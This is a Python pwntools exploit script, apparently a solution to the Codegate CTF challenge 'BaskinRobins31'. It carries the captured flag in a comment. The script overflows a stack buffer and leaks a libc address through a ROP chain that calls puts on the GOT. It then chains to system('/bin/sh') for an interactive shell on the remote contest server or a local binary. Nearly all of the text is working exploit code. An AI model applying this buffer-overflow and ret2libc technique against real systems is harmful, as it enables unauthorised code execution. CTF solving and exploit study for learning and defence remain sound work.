# coding: utf-8
#flag{The Korean name of "Puss in boots" is "My mom is an alien"}
from pwn import *
import sys

context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote('ch41l3ng3s.codegate.kr', 3131)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r = process('./BaskinRobins31')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    context.log_level = "debug"
    #gdb.attach(r)

def menu(r):
    print r.recvuntil("(1-3)\n")

def overflow(payload):
    #perform leak. Orginally thought I would have to perform multiple leaks and look up libc in a database, but they were using the same libc as me.
    menu(r)
    offset = 0xb0 #to rbp
    r.sendline('A'*0xb0 + p64(0xdeadbeefdeadbeef) + payload)
    print r.recvuntil(':( \n')

#leak
b = ELF('BaskinRobins31')
main = 0x400a4b
rop = ROP(b)
rop.puts(b.got['puts'])
rop.call(main)
rop.dump()
overflow(str(rop))
puts_leak =  r.recvuntil('\n')[:-1]
puts_leak += '\x00'*(8-len(puts_leak))
puts_leak = u64(puts_leak)
libc_base = puts_leak-libc.symbols['puts']
print "Puts leak = {}".format(hex(puts_leak))
print "Libc at {}".format(hex(libc_base))
libc.address = libc_base
#pwn
rop = ROP(libc)
rop.system(next(libc.search("/bin/sh\x00")))
print rop.dump()
overflow(str(rop))
r.interactive()
